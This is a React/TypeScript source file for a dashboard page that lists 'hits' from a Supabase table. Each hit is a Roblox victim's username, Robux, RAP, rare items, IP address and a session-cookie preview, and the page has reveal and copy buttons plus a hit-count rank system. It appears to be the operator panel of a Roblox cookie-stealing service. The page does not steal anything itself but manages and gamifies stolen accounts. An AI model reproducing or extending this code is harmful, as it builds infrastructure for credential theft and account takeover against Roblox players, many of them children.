import React, { useEffect, useMemo, useState } from 'react';
import { useOutletContext } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import { Loader2, Eye, EyeOff, Copy, Crown, Skull } from 'lucide-react';
import type { DashboardProfile } from './DashboardLayout';
import { getRank } from '@/config/toolsConfig';

interface HitRow {
  id: string;
  tool_type: string;
  roblox_username: string | null;
  roblox_robux: number | null;
  roblox_rap: number | null;
  roblox_premium: boolean | null;
  roblox_has_korblox: boolean | null;
  roblox_has_headless: boolean | null;
  roblox_headshot_url: string | null;
  cookie_preview: string | null;
  ip_address: string | null;
  created_at: string;
}

const HitsPage = () => {
  const { profile } = useOutletContext<{ profile: DashboardProfile }>();
  const [hits, setHits] = useState<HitRow[] | null>(null);
  const [revealed, setRevealed] = useState<Record<string, boolean>>({});

  useEffect(() => {
    supabase
      .from('hits')
      .select('id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_headshot_url, cookie_preview, ip_address, created_at')
      .eq('owner_id', profile.id)
      .order('created_at', { ascending: false })
      .limit(100)
      .then(({ data, error }) => {
        if (error) toast.error(error.message);
        setHits((data as HitRow[]) ?? []);
      });
  }, [profile.id]);

  const stats = useMemo(() => {
    if (!hits) return null;
    let robux = 0, rap = 0, korblox = 0, headless = 0;
    for (const h of hits) {
      robux += h.roblox_robux ?? 0;
      rap += h.roblox_rap ?? 0;
      if (h.roblox_has_korblox) korblox++;
      if (h.roblox_has_headless) headless++;
    }
    return { total: hits.length, robux, rap, korblox, headless };
  }, [hits]);

  if (hits === null || !stats) {
    return (
      <div className="flex justify-center py-12">
        <Loader2 className="h-6 w-6 animate-spin text-blox-teal" />
      </div>
    );
  }

  const rank = getRank(stats.total);

  const StatCard = ({ label, value }: { label: string; value: React.ReactNode }) => (
    <div className="blox-card p-4">
      <div className="text-xs uppercase text-gray-400">{label}</div>
      <div className="text-xl font-bold mt-1">{value}</div>
    </div>
  );

  const copy = (txt: string) => {
    navigator.clipboard.writeText(txt);
    toast.success('Copied');
  };

  return (
    <div className="space-y-6">
      <div className="blox-card p-5 flex items-center gap-4">
        <div className="flex-1">
          <div className="text-sm text-gray-400">Your rank</div>
          <div className="text-2xl font-bold text-blox-teal">{rank.current.name}</div>
          {rank.next && (
            <div className="text-xs text-gray-500 mt-1">
              {rank.next.min - stats.total} hits until <span className="text-gray-300">{rank.next.name}</span>
            </div>
          )}
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
        <StatCard label="Total Hits" value={stats.total} />
        <StatCard label="Total Robux" value={stats.robux.toLocaleString()} />
        <StatCard label="Total RAP" value={stats.rap.toLocaleString()} />
        <StatCard label="Korblox" value={<span className="flex items-center gap-1"><Skull className="h-4 w-4 text-red-400" />{stats.korblox}</span>} />
        <StatCard label="Headless" value={<span className="flex items-center gap-1"><Crown className="h-4 w-4 text-yellow-400" />{stats.headless}</span>} />
      </div>

      <div>
        <h2 className="text-lg font-semibold mb-2">Recent Hits</h2>
        {hits.length === 0 ? (
          <div className="blox-card p-6 text-center text-gray-400">No hits yet.</div>
        ) : (
          <div className="space-y-3">
            {hits.map((h) => (
              <div key={h.id} className="blox-card p-4">
                <div className="flex items-start gap-4">
                  {h.roblox_headshot_url ? (
                    <img src={h.roblox_headshot_url} alt="" className="w-14 h-14 rounded-full bg-black/40 shrink-0" />
                  ) : (
                    <div className="w-14 h-14 rounded-full bg-black/40 shrink-0" />
                  )}
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between gap-2 flex-wrap">
                      <div className="font-semibold truncate">
                        {h.roblox_username || 'Unknown user'}{' '}
                        <span className="text-gray-400 text-sm font-normal">— {h.tool_type}</span>
                      </div>
                      <div className="text-xs text-gray-500">{new Date(h.created_at).toLocaleString()}</div>
                    </div>
                    <div className="text-sm text-gray-400 mt-2 grid grid-cols-2 md:grid-cols-3 gap-x-4 gap-y-1">
                      <span>Robux: <span className="text-gray-200">{h.roblox_robux ?? '?'}</span></span>
                      <span>RAP: <span className="text-gray-200">{h.roblox_rap ?? '?'}</span></span>
                      <span>Premium: <span className="text-gray-200">{h.roblox_premium === null ? '?' : h.roblox_premium ? 'Yes' : 'No'}</span></span>
                      <span>Korblox: <span className="text-gray-200">{h.roblox_has_korblox === null ? '?' : h.roblox_has_korblox ? 'Yes' : 'No'}</span></span>
                      <span>Headless: <span className="text-gray-200">{h.roblox_has_headless === null ? '?' : h.roblox_has_headless ? 'Yes' : 'No'}</span></span>
                      <span>IP: <span className="text-gray-200">{h.ip_address ?? '?'}</span></span>
                    </div>
                    {h.cookie_preview && (
                      <div className="mt-3 flex items-center gap-2">
                        <span className="text-xs text-gray-500">Cookie:</span>
                        <code className="text-xs bg-black/40 px-2 py-1 rounded font-mono">
                          {revealed[h.id] ? h.cookie_preview : '••••••••' + h.cookie_preview.slice(-4)}
                        </code>
                        <button onClick={() => setRevealed((r) => ({ ...r, [h.id]: !r[h.id] }))} className="text-gray-400 hover:text-blox-teal" title={revealed[h.id] ? 'Hide' : 'Show'}>
                          {revealed[h.id] ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </button>
                        <button onClick={() => copy(h.cookie_preview!)} className="text-gray-400 hover:text-blox-teal" title="Copy">
                          <Copy className="h-4 w-4" />
                        </button>
                        <span className="text-[10px] text-gray-600 ml-auto">last 16 chars stored</span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default HitsPage;
